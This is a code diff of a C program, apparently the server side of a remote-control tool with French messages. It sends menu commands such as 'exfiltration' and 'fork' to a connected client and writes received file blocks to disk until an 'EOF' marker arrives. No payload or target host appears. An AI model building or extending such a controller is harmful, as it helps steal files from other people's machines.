@@ -130,6 +130,8 @@ int main()
                     break;
                 case 2:
                     command = "exfiltration";
+                    send(client_fd, command, strlen(command), 0);
+                    printf("la commande effectuer est : %s", command);
                     break;
                 case 3:
                     command = "fork";
@@ -182,6 +184,13 @@ int main()
                         break;
                     }
                     printf("Bloc reçu et écrit dans le fichier.\n");
+                    printf("Valeur de bytes_read : %d", bytes_read);
+
+                    if (strncmp(buffer, "EOF", 3) == 0)
+                    {
+                        printf("Fin du fichier reçue. Arrêt de la réception.\n");
+                        break; // Sortir de la boucle de réception
+                    }
                 }
 
                 if (bytes_read == -1)
@@ -200,5 +209,4 @@ int main()
 
     close(socket_fd);
     return 0;
-}
 }
